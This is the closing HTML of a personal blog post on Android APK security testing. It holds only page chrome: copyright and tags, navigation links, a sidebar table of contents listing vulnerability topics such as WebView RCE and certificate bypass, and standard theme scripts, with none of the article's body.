+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>shaoxinSEC
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2025/11/06/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" title="APK安全测试">http://example.com/2025/11/06/APK安全测试/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/APP-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tag"></i> APP 移动安全 安卓安全测试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/04/RedteamNotes/" rel="prev" title="RedteamNotes">
+      <i class="fa fa-chevron-left"></i> RedteamNotes
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/06/SRC%E6%8C%96%E6%8E%98/" rel="next" title="SRC挖掘">
+      SRC挖掘 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#How-to-sniff-packet"><span class="nav-number">1.</span> <span class="nav-text">How to sniff packet?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8DFrida%E8%B0%83%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">反Frida调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E5%90%AF%E5%8A%A8%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.1.</span> <span class="nav-text">修改启动端口</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Four-Major-Components"><span class="nav-number">3.</span> <span class="nav-text">Four Major Components</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Activity"><span class="nav-number">3.1.</span> <span class="nav-text">Activity</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Unauthorized-Access"><span class="nav-number">3.1.1.</span> <span class="nav-text">Unauthorized Access</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Implicit-Itent-Hijacking"><span class="nav-number">3.1.2.</span> <span class="nav-text">Implicit Itent Hijacking</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Service"><span class="nav-number">3.2.</span> <span class="nav-text">Service</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Unauthorized-Access-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">Unauthorized Access</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Implicit-Itent-Hijacking-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">Implicit Itent Hijacking</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Broadcast"><span class="nav-number">3.3.</span> <span class="nav-text">Broadcast</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Unauthorized-Access-2"><span class="nav-number">3.3.1.</span> <span class="nav-text">Unauthorized Access</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Provider"><span class="nav-number">3.4.</span> <span class="nav-text">Provider</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Unauthorized-Access-3"><span class="nav-number">3.4.1.</span> <span class="nav-text">Unauthorized Access</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Injection"><span class="nav-number">3.4.2.</span> <span class="nav-text">SQL Injection</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Directory-Traversal"><span class="nav-number">3.4.3.</span> <span class="nav-text">Directory Traversal</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsafe-Configuration"><span class="nav-number">4.</span> <span class="nav-text">Unsafe Configuration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Allow-Backup"><span class="nav-number">4.1.</span> <span class="nav-text">Allow Backup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Debuggable"><span class="nav-number">4.2.</span> <span class="nav-text">Debuggable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-Leakage"><span class="nav-number">4.3.</span> <span class="nav-text">Information Leakage</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LogCat%E8%BE%93%E5%87%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.3.1.</span> <span class="nav-text">LogCat输出敏感信息漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AC%E7%BC%96%E7%A0%81"><span class="nav-number">4.3.2.</span> <span class="nav-text">硬编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Shared-Preference%E5%85%A8%E5%B1%80%E5%8F%AF%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.3.3.</span> <span class="nav-text">Shared Preference全局可读写漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SD%E5%8D%A1%E8%AF%BB%E5%86%99"><span class="nav-number">4.3.4.</span> <span class="nav-text">SD卡读写</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsafe-HTTP-s"><span class="nav-number">5.</span> <span class="nav-text">Unsafe HTTP&#x2F;s</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Plaintext-Transmit"><span class="nav-number">5.1.</span> <span class="nav-text">Plaintext Transmit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lack-verification-of-certificate"><span class="nav-number">5.2.</span> <span class="nav-text">Lack verification of certificate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lack-verification-of-hostname"><span class="nav-number">5.3.</span> <span class="nav-text">Lack verification of hostname</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-certificate"><span class="nav-number">5.4.</span> <span class="nav-text">Bypass certificate</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Captcha"><span class="nav-number">6.</span> <span class="nav-text">Captcha</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Brute-Force"><span class="nav-number">6.1.</span> <span class="nav-text">Brute Force</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Interface-Abuse"><span class="nav-number">6.2.</span> <span class="nav-text">Interface Abuse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Amnipotent-Captcha"><span class="nav-number">6.3.</span> <span class="nav-text">Amnipotent Captcha</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass"><span class="nav-number">6.4.</span> <span class="nav-text">Bypass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebView"><span class="nav-number">7.</span> <span class="nav-text">WebView</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE"><span class="nav-number">7.1.</span> <span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Plaintext-Strorage"><span class="nav-number">7.2.</span> <span class="nav-text">Plaintext Strorage</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">7.3.</span> <span class="nav-text">任意文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E7%95%8C%E9%9D%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">7.4.</span> <span class="nav-text">任意界面注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie%E7%9B%97%E7%94%A8"><span class="nav-number">7.5.</span> <span class="nav-text">Cookie盗用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Launch-Any-Where"><span class="nav-number">7.6.</span> <span class="nav-text">Launch Any Where</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DeepLink-RCE"><span class="nav-number">7.7.</span> <span class="nav-text">DeepLink_RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WebView-loadDataWithBaseURL"><span class="nav-number">7.8.</span> <span class="nav-text">WebView loadDataWithBaseURL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other"><span class="nav-number">8.</span> <span class="nav-text">Other</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD"><span class="nav-number">8.1.</span> <span class="nav-text">不安全的动态加载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%90%8D%E7%BB%95%E8%BF%87"><span class="nav-number">8.2.</span> <span class="nav-text">签名绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ZIP"><span class="nav-number">8.3.</span> <span class="nav-text">ZIP</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="shaoxinSEC"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">shaoxinSEC</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/shaoxinsec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;shaoxinsec" rel="noopener" target="_blank"><i class="fab fa-gitee fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shaoxinSEC</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">46k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">42 mins.</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
